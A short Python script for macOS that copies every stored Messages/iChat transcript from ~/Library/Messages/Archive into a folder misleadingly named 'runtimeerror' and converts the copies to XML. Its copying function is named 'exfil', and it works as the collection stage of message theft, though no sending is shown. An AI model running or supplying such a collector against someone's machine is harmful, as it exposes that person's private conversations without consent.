#messer.py
import subprocess
import os
import sys
import shutil
import ntpath

def traverse_arch(pathta, fn):
    for filename in os.listdir(pathta):
        f = os.path.join(pathta, filename)
        if os.path.isfile(f):
            print(f)
            exfil(f, fn)

def exfil(fp, fn):
    destp = os.path.expanduser('~')+"/temp/runtimeerror/"+fn
    shutil.copy2(fp, destp)
    #plutil -convert xml1 transcript.ichat
    destfp = fp.split('/')
    destfp = destfp[len(destfp)-1]
    print("=====")
    destfp = os.path.join(destp, destfp)
    print(destfp)
    print("=====")
    convfiles = subprocess.run(["plutil", "-convert", "xml1", destfp])
    #print("The exit code was: %d" % convfiles.returncode)


def convert_extract_copy():
    dir = os.path.expanduser('~')+"/Library/Messages/Archive"
    directory = dir#'/Users/amigo/Desktop'

    os.mkdir(os.path.expanduser('~')+"/temp/")
    os.mkdir(os.path.expanduser('~')+"/temp/"+"runtimeerror")

    # iterate over files in
    # that directory
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        # checking if it is a file
        if os.path.isfile(f):
            pass
        else:
            os.mkdir(os.path.expanduser('~')+"/temp/runtimeerror/"+filename)
            subdirectories = traverse_arch(f, filename)

convert_extract_copy()
